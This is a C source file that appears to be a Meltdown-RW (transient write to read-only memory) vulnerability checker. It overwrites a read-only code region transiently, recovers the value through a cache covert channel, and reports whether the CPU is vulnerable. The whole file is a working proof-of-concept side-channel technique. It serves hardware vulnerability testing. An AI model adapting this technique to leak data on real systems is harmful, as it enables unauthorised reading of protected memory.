#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>

#include "libcache/cache.h"
#include "lib/global.h"

void readonly_area()
{
    asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
    asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
    asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
    asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
}

int main(int argc, char **argv)
{
    PREPARE();
    // Flush our shared memory
    flush_shared_memory();
    start_time = time(NULL);
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        if (try_start())
        {
            //Null pointer access prolongs transient window
            maccess(0);
            //overwrite read-only data
            (*((volatile char *)((size_t)readonly_area + 32))) = 'S';
            //access shared memory based on overwritten value
            maccess(mem + *((volatile char *)((size_t)readonly_area + 32)) * pagesize);

            try_abort();
        }
        try_end();

        //Recover data from cache covert channel
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Meltdown_RW: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    // printf("%lf\n", (double)passed_count/MAX_TRY_TIMES);
    int exit_result = 0;
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_RW: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_RW: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}